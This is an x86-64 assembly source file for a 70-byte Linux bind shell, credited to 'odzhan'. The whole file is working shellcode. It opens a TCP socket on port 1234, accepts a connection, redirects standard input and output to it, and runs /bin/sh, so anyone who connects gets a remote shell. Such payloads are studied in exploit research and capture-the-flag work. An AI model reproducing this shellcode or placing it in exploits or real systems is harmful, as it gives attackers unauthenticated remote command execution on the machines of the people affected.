

; 70 byte bind shell for linux/x64
; odzhan

    bits 64
    
start64:
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    41
    pop     rax
    cdq
    push    1
    pop     rsi
    push    2
    pop     rdi
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    
    ; step 2, bind to port 1234 
    ; bind(sockfd, {AF_INET,1234,INADDR_ANY}, 16)
    push    rdx
    push    word 0xd204
    push    word ax
    push    rsp
    pop     rsi
    mov     dl, 16
    mov     al, 49
    syscall
    
    ; step 3, listen
    ; listen(sockfd, 0);
    push    rax
    pop     rsi
    mov     al, 50
    syscall
    
    ; step 4, accept connections
    ; accept(sockfd, 0, 0);
    mov     al, 43
    syscall
    
    xchg    eax, edi         ; edi=sockfd
    xchg    eax, esi         ; esi=2
    
    ; step 5, assign socket handle to stdin,stdout,stderr
    ; dup2(sockfd, fileno);
dup_loop64:
    push    33               ; rax=sys_dup2
    pop     rax
    syscall
    dec     esi
    jns     dup_loop64       ; jump if not signed   
    
    ; step 6, execute /bin/sh
    ; execve("/bin//sh", 0, 0);
    cdq                      ; rdx=0
    xor     esi, esi         ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, 0x68732f2f6e69622f ; "/bin//sh"
    push    rcx
    push    rsp
    pop     rdi
    mov     al, 59           ; rax=sys_execve
    syscall
